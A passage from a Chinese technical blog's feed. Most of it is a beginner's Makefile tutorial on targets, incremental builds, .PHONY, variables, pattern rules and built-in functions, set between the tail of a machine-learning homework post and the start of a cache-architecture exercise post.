b_{k}}\frac{\partial a_{i,k}}{\partial z_{i,k}}\frac{\partial E_i}{\partial a_{i,k}}\]</span> <span class="math inline">\(\frac{\partial z_{i,k}}{\partialb_{k}}=b^{(1)}\)</span>，其余部分也都已经知道了，因此代入即可按同样的方式更新<span class="math inline">\(\boldsymbol b\)</span>。</p><p>至此，所有的权重和偏置项都已经更新完毕。</p><h2 id="思考">思考</h2><p>这个正则项与线性判别分析一样，思路很自然，数学表达也很严谨，确远不如L1或L2正则项用的广泛。虽然并没有基于此做过实验，但从推导的过程可以看到，相比L1或L2正则项直接对权重矩阵的范数求导，计算量明显要大的多。比如至少要预先把预测每一类对应的样本数和样本向量均值算出来，在求偏导时也要判断是属于哪一类，对性能肯定是有所损耗。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>makefile急速入门</title>
    <link href="/posts/23557/"/>
    <url>/posts/23557/</url>
    
    <content type="html"><![CDATA[<h1 id="makefile-急速入门">Makefile 急速入门</h1><p>或许你和我一样在完全没有接触过<code>makefile</code>的时候看到相对复杂一点的项目依赖感到头大。这里从最简单的情况，到常见用法，快速把<code>makefile</code>的基本用法捋一遍。</p><h2 id="最小示例">最小示例</h2><p>下面的过程想必接触过linux平台下的编程都应该很熟悉：</p><p>新建一个示例程序<em>main.c</em>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bii6r6lluwpkzu"></i><span>c++</span><div class="collapse show" id="collapse-bii6r6lluwpkzu"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<span class="hljs-built_in">printf</span>(<span class="hljs-string">"hello world!"</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p>正常情况下，通过 <code>gcc</code>在命令行将其编译后产出相应文件，可执行文件或 object 文件等。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-sqawdqlluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-sqawdqlluwpkzu"><pre><code class="hljs shell">(base) ➜ gcc -o main.out main.c</code></pre></div></div><p>上面命令编译后运行 <code>main.out</code> 可执行文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gnij41lluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-gnij41lluwpkzu"><pre><code class="hljs shell">(base) ➜ ./main.outhello world!</code></pre></div></div><h2 id="makefile-初步认知">Makefile 初步认知</h2><h3 id="从动手做开始">从动手做开始</h3><p>如果我们想用到中间代码联合编译/链接，或者有大量的源文件做不同的处理，那么敲一行一行的命令将是灾难级的。即使通过按上下箭头的方式回退命令也会浪费很多时间，这时<code>makefile</code>的作用便显现出来了。但是为了便于学习，从上面的最小示例开始，先动手做一下，有一个感性的认知：</p><p>在与<code>main.c</code>同目录下创建文件<code>makefile</code>:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-79dwzelluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-79dwzelluwpkzu"><pre><code class="hljs shell">touch makefile</code></pre></div></div><p>填入以下内容：</p><p><em>Makefile</em></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vie4pblluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-vie4pblluwpkzu"><pre><code class="hljs makefile"><span class="hljs-section">all:main.out</span>  <span class="hljs-comment"># make all</span><span class="hljs-section">main.out: main.c</span><span class="hljs-comment"># test make</span>gcc -o main.out main.c<span class="hljs-section">clean:</span>rm main.out</code></pre></div></div><p>上面的 Makefile 中定义了三个任务，调用时可通过<code>make &lt;target name&gt;</code> 形式来调用。</p><p>比如:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-g7cem7lluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-g7cem7lluwpkzu"><pre><code class="hljs shell">(base) ➜ make main.out<span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">test</span> make</span>gcc -o main.out main.c</code></pre></div></div><p>默认情况下<code>makefile</code>会打印每条命令(包括注释)，然后再执行，也就是所谓的echoing。这是在基于在构建时需要了解当前在执行哪条命令的需要。</p><p>之后你会发现在目录下产生了<code>main.out</code> 文件。</p><p>如果想关闭回声，可以在命令的前面加上@。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ykbu5flluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-ykbu5flluwpkzu"><pre><code class="hljs makefile"><span class="hljs-section">main.out: main.c</span>@<span class="hljs-comment"># test make</span>gcc -o main.out main.c</code></pre></div></div><p>习惯上<code>clean</code>任务被定义用于清除生成的目标构建文件。在这里试一下用<code>clean</code>把刚刚的<code>main.out</code>删掉：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lyzn17lluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-lyzn17lluwpkzu"><pre><code class="hljs shell">(base) ➜ make cleanrm main.out</code></pre></div></div><p>如果<code>make</code>后面什么都不跟，会默认只执行第一个任务。因此我们通常会在第一行定义一个依赖(习惯上叫做<code>all</code>)来使<code>makefile</code>在我们输入<code>make</code>时能够将所有需要的目标都构建出来。</p><p>可以试一下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rnah6illuwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-rnah6illuwpkzu"><pre><code class="hljs shell">(base) ➜ makegcc -o main.out main.c<span class="hljs-meta prompt_"># </span><span class="language-bash">make all</span></code></pre></div></div><p>和所预料的一样。</p><h3 id="make-规则">Make 规则</h3><p>可以看到，通过 <code>make</code>命令，能将上面的编译进行有效自动化管理。通过将从输入文件到输出文件的编译规则编写成Makefile 脚本，Make 工具将自动处理文件间依赖及是否需要编译的检测。</p><p>定义任务的基本语法为：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pbwr9jlluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-pbwr9jlluwpkzu"><pre><code class="hljs makefile">target [target2 ...]: [pre-req-1 pre-req-2 ...][command1 command2 ......]</code></pre></div></div><p>其中，</p><ul><li><code>target</code>为任务名或文件产出。从上面的例子可以看出，<code>target</code>可以是一个目标文件(如<code>main.out</code>)，也可以是一个执行文件，还可以是一个标签（如<code>all</code>，<code>clean</code>)等。</li><li><code>pre-req123...</code>这些是依赖项，即该任务所需要的外部输入，这些输入可以是已有的文件，也可以是其他任务产出的文件。</li><li><code>command</code> 为该任务具体需要执行的 shell 命令。</li></ul><p>因此简单的说，我们把想生成的文件或者想执行的命令名写到冒号前面，把生成的目标文件依赖文件写到冒号后面，下面<code>tab</code>对齐写想执行的命令就可以了。</p><h3 id="make是如何工作的">make是如何工作的</h3><p>现在来以输入<code>make</code>命令为例，简要分析make的工作过程。</p><p>首先在当前目录下找名字叫“makefile”的文件；</p><blockquote><p>事实上，执行make命令时，是按照GNUmakefile、makefile、Makefile的顺序依次尝试找到存在的文件并执行。</p></blockquote><p><code>make</code>执行第一条指令对应任务<code>all</code>；</p><p><code>all</code>发现其依赖<code>main.out</code>不存在，需要更新，转而去执行<code>main.out</code>对应的任务；</p><p><code>main.out</code>发现它所依赖的<code>main.c</code>不存在，需要更新，而且没有找到对应<code>main.c</code>任务，执行自己的<code>command</code>产生<code>main.c</code>；</p><p><code>main.out</code>执行完了，<code>all</code>继续执行自己的<code>command</code>把注释打印了出来。</p><h3 id="增量编译">增量编译</h3><p>其实上面说的还不是很严谨。准确的说，在执行任务时，它会先检查依赖项是否比需要产出的文件新，如果说依赖项更新(包括依赖项不存在)，则说明我们需要产出的目标文件属于过时的产物，需要重新生成。</p><p>什么意思。比如上面的示例，当执行</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fc4hh9lluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-fc4hh9lluwpkzu"><pre><code class="hljs shell">(base) ➜ make main.out</code></pre></div></div><p>试图生成 <code>main.out</code> 产出时，会检查这个任务的依赖文件<code>main.c</code> 是否有修改过。</p><p>前面我们已经执行过该任务产生过<code>main.out</code>。再次执行时，会得到如下提示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gsgaojlluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-gsgaojlluwpkzu"><pre><code class="hljs shell">(base) ➜ make main.out make: Nothing to be done for 'main.out'.</code></pre></div></div><blockquote><p>有的版本的GNU make 提示的也可能是 make: 'main.out' is up to date.</p></blockquote><p>现在对输入文件 <code>main.c</code> 进行修改：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tdbj9ulluwpkzu"></i><span>c++</span><div class="collapse show" id="collapse-tdbj9ulluwpkzu"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{-     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hello world!"</span>);+     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hello ucore!"</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p>再次执行 <code>make main.out</code>会发现任务正常执行并产生了新的输出，</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gb0507lluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-gb0507lluwpkzu"><pre><code class="hljs shell">(base) ➜ make main.outgcc -o main.out main.c(base) ➜ ./main.outhello ucore!⏎</code></pre></div></div><p>这里 <code>main.c</code> 修改后，它在文件上来说，就比<code>main.out</code> 更新了，所以我们说 <code>main.out</code>这个目标， <strong>过时（out-dated）</strong> 了。</p><p>过时的任务才会被重新执行，而未过时的会跳过，并输出相应信息。</p><p>Makefile 天然实现了增量编译的效果，这是使用 Makefile进行自动化编译的最大的方便之处。在大型项目下会节省不少编译时间，因为它只编译过期的任务。</p><h3 id="phony-类型任务的执行">Phony 类型任务的执行</h3><p>上面提到，<code>target</code>既可以是文件名，也可以是标签，那么<code>make</code>怎么知道到底是指哪一种情况？有疑惑就对了。我们还是通过实验来验证这个问题：</p><p>还是使用一开始的示例，这次钻一个牛角尖：在这个目录下创建一个名叫<code>clean</code>的文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-p12zr4lluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-p12zr4lluwpkzu"><pre><code class="hljs shell">touch clean</code></pre></div></div><p>然后再<code>make clean</code>一下，我们会看到：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yqu8tvlluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-yqu8tvlluwpkzu"><pre><code class="hljs shell">(base) ➜ make cleanmake: Nothing to be done for 'clean'.</code></pre></div></div><p>也就是说，<code>make</code>会将其优先视作文件。那么我们如果只是希望将其用作标签，那么应该如何解决呢？</p><p>Makefile中，有一个<code>.PHONY</code>指令。<a href="https://www.bilibili.com/video/BV1ih411e7gn/?spm_id_from=333.337.search-card.all.click&amp;vd_source=acb594007d0011f12244c20c5476e73d">Phony</a>的意思是伪造的，假的。可以理解为，在Makefile中，<code>.PHONY</code>后面的target表示的也是一个伪造的target,而不是真实存在的文件target。</p><p>因此，在头部加上一行<code>.PHONY: clean</code>就可以解决这样的二义性问题。</p><p>当然，即便不加<code>.PHONY</code>，将<code>target</code>用作标签的任务，也属于phony类型的任务，只是有潜在的二义性罢了。phony类型的任务永远都属于过时类型，即，每次 <code>make</code>都会执行。因为这种类型的任务它没有文件产出，就无所谓检查，它的主体只是调用了另外的命令而以。</p><p>拿这里的 <code>all</code> 来说，当我们连续两次执行 <code>make</code>或 <code>make all</code> 时，得到：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hzu4t1lluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-hzu4t1lluwpkzu"><pre><code class="hljs shell">(base) ➜ makegcc -o main.out main.c<span class="hljs-meta prompt_"># </span><span class="language-bash">make all</span>(base) ➜ make<span class="hljs-meta prompt_"># </span><span class="language-bash">make all</span></code></pre></div></div><p>可以看到，属于 phony 类型的任务 <code>all</code>每次都会执行其中定义的 <code>command</code>(在这里只是一行注释)，而非phony 类型的任务 <code>main.out</code> 则走了增量编译的逻辑。</p><h2 id="makefile-基本知识">Makefile 基本知识</h2><p>如果说通过上面的部分能够对<code>makefile</code>的工作方式和用途有了大概的理解，弄清楚下面的内容将能够看懂大部分<code>makefile</code>代码，并且尝试根据自己的实际情况添加或修改命令。</p><p>当然，如果要深入使用，还是离不开查阅文档。这里只是抛砖引玉，仅介绍部分最常用的语法和特性。</p><h3 id="变量宏">变量/宏</h3><p>Makefile 中可使用变量（宏）来让脚本更加灵活和减少冗余。</p><p>其中变量使用 <code>$</code>加圆括号或花括号的形式来使用，<code>$(VAR)</code>，定义时类似于 C中定义宏，所以变量也可叫 Makefile 中的宏，</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jnfsoplluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-jnfsoplluwpkzu"><pre><code class="hljs shell">CC=gcc</code></pre></div></div><p>这里定义 <code>CC</code> 表示 <code>gcc</code>编译工具。然后在后续编译命令中，就可以使用 <code>$(CC)</code> 代替<code>gcc</code> 来书写 shell 命令了。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0ebhq1lluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-0ebhq1lluwpkzu"><pre><code class="hljs makefile">+ CC=gcc<span class="hljs-section">all:main.out</span><span class="hljs-section">main.out: main.c</span>-gcc -o main.out main.c+<span class="hljs-variable">$(CC)</span> -o main.out main.c<span class="hljs-section">clean:</span>rm main.out</code></pre></div></div><p>这样做的好处是什么？因为编译工具可能随着平台或环境或需要编译的目标不同，而不同。比如<code>gcc</code> 只是用来编译 C 代码的，如果是 C++ 你可能要用<code>g++</code> 来编译。如果是编译 WebAssembly 则需要使用<code>emcc</code>。</p><p>无论怎样变，我们只需要修改定义在文件开头的 <code>CC</code>变量即可，无须修改其他地方。这当然只是其中一点好处。</p><h3 id="自动变量">自动变量</h3><p>自动变量是在编译规则匹配后工具进行设置的，具体包括：</p><ul><li><code>$@</code>：代表产出文件名</li><li><code>$*</code>：代表产出文件名不包括扩展名</li><li><code>$&lt;</code>：依赖项中第一个文件名</li><li><code>$^</code>：空格分隔的去重后的所有依赖项</li><li><code>$+</code>：同上，但没去重</li><li><code>$?</code>：同上，但只包含比产出更新的那些依赖</li></ul><p>这些变量都只有一个符号，区别于正常用字母命名的变量需要使用<code>$(VAL)</code> 的形式来使用，自动变量无需加括号。</p><p>利用自动变量，前面示例可改造成：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cb5n5dlluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-cb5n5dlluwpkzu"><pre><code class="hljs makefile">CC=gccTARGET=main.out<span class="hljs-section">all:<span class="hljs-variable">$(TARGET)</span></span><span class="hljs-variable">$(TARGET)</span>: main.c<span class="hljs-variable">$(CC)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span><span class="hljs-section">clean:</span>rm <span class="hljs-variable">$(TARGET)</span></code></pre></div></div><p>减少了重复代码，更加易于维护，需要修改时，改动比较小。</p><p>自动变量特别是<code>$@</code>和<code>$^</code>在实际中用的比较多，建议熟记。</p><h3 id="vpath-vpath">VPATH &amp; vpath</h3><p>可通过 <code>VPATH</code> 指定依赖文件及产出文件的搜索目录。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zmibt7lluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-zmibt7lluwpkzu"><pre><code class="hljs makefile">VPATH = src <span class="hljs-keyword">include</span></code></pre></div></div><p>通过小写的 <code>vpath</code> 可指定具体的文件名及扩展名类型，</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zgftoblluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-zgftoblluwpkzu"><pre><code class="hljs makefile"><span class="hljs-keyword">vpath</span> %.c src<span class="hljs-keyword">vpath</span> %.h <span class="hljs-keyword">include</span></code></pre></div></div><p>此处 <code>%</code> 表示文件名。</p><h3 id="依赖原则和匹配规则">依赖原则和匹配规则</h3><p>只定义了产出与依赖没包含任务命令的规则，我们常称为依赖规则。像下面这样：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6p3rgrlluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-6p3rgrlluwpkzu"><pre><code class="hljs makefile">Main.o : Main.h Test1.h Test2.hTest1.o : Test1.h Test2.hTest2.o : Test2.h</code></pre></div></div><p>这种规则可达到这种效果，即，右边任何文件有变更，左边的产出便成为过时的了。</p><p>区别于明确指定了产出与依赖，如果一条规则包含通配符，则称作匹配规则（PatternRules）。</p><p>比如，</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fovrg9lluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-fovrg9lluwpkzu"><pre><code class="hljs makefile"><span class="hljs-section">%.o: %.c</span>gcc -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span></code></pre></div></div><p>上面定义了这么一条编译规则，将所有匹配到的 c 文件编译成 Object产出。</p><p>有什么用？</p><p>这种规则一般不是直接调用的，是被其他它规则触间接使用。比如上面的依赖规则。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gev24dlluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-gev24dlluwpkzu"><pre><code class="hljs makefile">%.o : %.cppg++ -g -o <span class="hljs-variable">$@</span> -c <span class="hljs-variable">$&lt;</span>Main.o : Main.h Test1.h Test2.hTest1.o : Test1.h Test2.hTest2.o : Test2.h</code></pre></div></div><p>当右侧这些头文件有变动时，左边的产出会在 <code>make</code>时被检测到过时，于是会被执行。当执行时匹配规则 <code>%.o</code>会被匹配到，所以匹配规则里面的命令会执行，从而将 <code>cpp</code>文件编译成相应 Object文件。达到了依赖更新后批量更新产出的目的，而不需要写成这样：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fx4iu4lluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-fx4iu4lluwpkzu"><pre><code class="hljs makefile">Main.o : Main.h Test1.h Test2.h    g++ -g -o <span class="hljs-variable">$@</span> -c <span class="hljs-variable">$&lt;</span>Test1.o : Test1.h Test2.h    g++ -g -o <span class="hljs-variable">$@</span> -c <span class="hljs-variable">$&lt;</span>Test2.o : Test2.h    g++ -g -o <span class="hljs-variable">$@</span> -c <span class="hljs-variable">$&lt;</span></code></pre></div></div><h3 id="makefile-赋值">Makefile 赋值</h3><p><code>=</code> : <strong>最容易出错</strong> 的赋值等号</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-i7kdkalluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-i7kdkalluwpkzu"><pre><code class="hljs makefile">VIR_A = AVIR_B = <span class="hljs-variable">$(VIR_A)</span> BVIR_A = AA</code></pre></div></div><p>最后<code>VIR_B</code>的值是<code>AA B</code>，而不是<code>A B</code>。在make时，会把整个makefile展开，最后决定变量的值</p><p><code>?=</code> : 如果没有被赋值过，则赋值等号后面的操作</p><p><code>+=</code> : 追加(append)</p><p><code>:=</code> : <strong>“正常”</strong> 的赋值</p><p>以一个小例子进行说明：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4g21chlluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-4g21chlluwpkzu"><pre><code class="hljs makefile"><span class="hljs-keyword">ifdef</span> DEFINE_VARVAR = “Hello World!”<span class="hljs-keyword">else</span><span class="hljs-keyword">endif</span><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(OPT)</span>,<span class="hljs-keyword">define</span>)VAR ?= “Hello World! First!”<span class="hljs-keyword">endif</span><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(OPT)</span>,add)VAR += “Kelly!”<span class="hljs-keyword">endif</span><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(OPT)</span>,recover)VAR := “Hello World! Again!”<span class="hljs-keyword">endif</span><span class="hljs-section">all:</span>@echo <span class="hljs-variable">$(VAR)</span></code></pre></div></div><p>测试这些命令：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-e59r7mlluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-e59r7mlluwpkzu"><pre><code class="hljs shell">(base) ➜ make DEFINE_VAR=true OPT=define“Hello World!”(base) ➜ make DEFINE_VAR=true OPT=add“Hello World!” “Kelly!”(base) ➜ make DEFINE_VAR=true OPT=recover“Hello World! Again!”(base) ➜ make DEFINE_VAR= OPT=define“Hello World! First!”(base) ➜ make DEFINE_VAR= OPT=add“Kelly!”(base) ➜ make DEFINE_VAR= OPT=recover“Hello World! Again!”</code></pre></div></div><h3 id="makefile-函数">Makefile 函数</h3><p>函数主要分为两类：make内嵌函数和用户自定义函数。对于 GNUmake内嵌的函数，直接引用就可以了；对于用户自定义的函数，要通过make的call函数来间接调用。</p><h4 id="内置函数">内置函数</h4><h5 id="通配符函数">通配符函数</h5><p>当我们想要对文件名进行通配时，可以采用通配符*或%来进行，如上所述。但只能将其用于规则目标或依赖以及<code>shell</code>命令中：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-oj7is0lluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-oj7is0lluwpkzu"><pre><code class="hljs makefile"><span class="hljs-section">test: *.o</span>gcc -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span><span class="hljs-section">*.o: *.c    </span>gcc -c <span class="hljs-variable">$^</span></code></pre></div></div><p>但是其他情况比如如果我们想要获取某个目录下所有的C文件列表，可以使用扩展通配符函数<code>wildcard</code>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fgl7pnlluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-fgl7pnlluwpkzu"><pre><code class="hljs makefile">SRC  = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> *.c)</span>HEAD = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> *.h)</span><span class="hljs-section">all:    </span>@echo <span class="hljs-string">"SRC = <span class="hljs-variable">$(SRC)</span>"</span>    @echo <span class="hljs-string">"HEAD = <span class="hljs-variable">$(HEAD)</span>"</span></code></pre></div></div><h5 id="文本处理函数">文本处理函数</h5><p>如果需要在makefile里进行文件名查找、替换、过滤等操作，则文本处理函数能够帮到忙。可以参阅<a href="https://www.zhaixue.cc/makefile/makefile-text-func.html">这个网站</a>的介绍。</p><h5 id="shell-函数">shell 函数</h5><p>用shell函数在<code>makefile</code>执行过程中使用shell命令。函数的参数就是命令，返回值是命令的执行结果。它和反引号`` 具有相同的功能。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5n91hclluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-5n91hclluwpkzu"><pre><code class="hljs makefile"><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: all</span>current_path = <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><span class="hljs-section">all:    </span>@echo <span class="hljs-string">"current_path = <span class="hljs-variable">$(current_path)</span>"</span></code></pre></div></div><h5 id="addprefix">addprefix</h5><p>格式：$(addprefix <code>prefix</code>,<code>&lt;names...&gt;</code>)功能：为文件序列添加前缀</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qjv3t3lluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-qjv3t3lluwpkzu"><pre><code class="hljs makefile">Variable := <span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> src/,foo bar)</span><span class="hljs-comment"># Variable ==&gt; src/foo src/bar</span></code></pre></div></div><h5 id="addsuffix">addsuffix</h5><p>格式：$(addsuffix<code>addsuffix</code>,<code>&lt;names...&gt;</code>)功能：为文件序列添加后缀</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-l9er0vlluwpkzu"></i><span>gams</span><div class="collapse show" id="collapse-l9er0vlluwpkzu"><pre><code class="hljs gams"><span class="hljs-keyword">Variable</span> := $(addsuffix <span class="hljs-comment">.c,foo bar)</span># <span class="hljs-keyword">Variable</span> <span class="hljs-comment">==&gt; foo.c bar.c</span></code></pre></div></div><h5 id="basename">basename</h5><p>格式：$(basename <code>&lt;names...&gt;</code>)功能：从文件名序列中取出各个文件名的前缀部分（除去扩展名后的剩余部分）</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hvc81ylluwpkzu"></i><span>gams</span><div class="collapse show" id="collapse-hvc81ylluwpkzu"><pre><code class="hljs gams"><span class="hljs-keyword">Variable</span> := $(basename <span class="hljs-comment">src</span>/foo.c src<span class="hljs-number">-1.0</span>/<span class="hljs-comment">bar.c hacks)</span># <span class="hljs-keyword">Variable</span> <span class="hljs-comment">==&gt; src</span>/foo src<span class="hljs-number">-1.0</span>/<span class="hljs-comment">bar hacks</span></code></pre></div></div><h4 id="用户自定义函数">用户自定义函数</h4><p>GNUmake提供了大量的内嵌函数，大大方便了makefile编写。但根据需要，我们也需要自定义一些函数，然后在makefile中引用它们：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wo7ahllluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-wo7ahllluwpkzu"><pre><code class="hljs makefile"><span class="hljs-section">PHONY: all</span><span class="hljs-keyword">define</span> func    @echo <span class="hljs-string">"pram1 = $(0)"</span>    @echo <span class="hljs-string">"pram2 = $(1)"</span><span class="hljs-keyword">endef</span><span class="hljs-section">all:    </span><span class="hljs-variable">$(<span class="hljs-built_in">call</span> func, hello zhaixue.cc)</span></code></pre></div></div><p>用户自定义函以define开头，endef结束，给函数传递的参数在函数中使用$(0)、$(1)引用，分别表示第1个参数、第2个参数…调用时要使用call函数间接调用，各个参数之间使用空格隔开。</p><h2 id="参考链接">参考链接</h2><p>如果希望进行更深入的了解可以参阅：</p><p><a href="https://www.gnu.org/software/make/">GNU make官网</a></p><p><a href="https://www3.ntu.edu.sg/home/ehchua/programming/cpp/gcc_make.html#zz-2.">GCCand Make Compiling, Linking and Building C/C++ Applications</a></p><p>以及中文教程：</p><p><a href="https://seisman.github.io/how-to-write-makefile/index.html">跟我一起写Makefile</a></p>]]></content>
    
    
    <categories>
      
      <category>小寄巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>体系结构-cache</title>
    <link href="/posts/64660/"/>
    <url>/posts/64660/</url>
    
    <content type="html"><![CDATA[<h1 id="体系结构-cache经典题目">体系结构-cache经典题目</h1><p>这是计算机体系结构的课后习题。通过逆向的思维更深的理解了cache的结构和cache优化的方向，是一道挺有意思的题。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210608104356_209_20221107220133912940_232_image-20221107215520312.png" alt="image-20221107215520312"><figcaption aria-hidden="true">image-20221107215520312</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210609246535_910_20221107135836770239_118_BDE01ED506906D92EDDFF59FB5BA32D9.jpg" alt="BDE01ED506906D92EDDFF59FB5BA32D9"><figcaption aria-hidden="true">BDE01ED506906D92EDDFF59FB5BA32D9</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210610253001_340_20221110201157288967_934_image-20221110201142068.png" alt="image-20221110201142068"><figcaption aria-hidden="true">image-20221110201142068</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210611676607_892_20221107220136090940_467_image-20221107220004897.png" alt="image-20221107220004897"><figcaption aria-hidden="true">image-20221107220004897</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210615742399_967_20221107135841382575_356_74966D2A3FF6BD074F7A29C5CF3A4832.jpg" 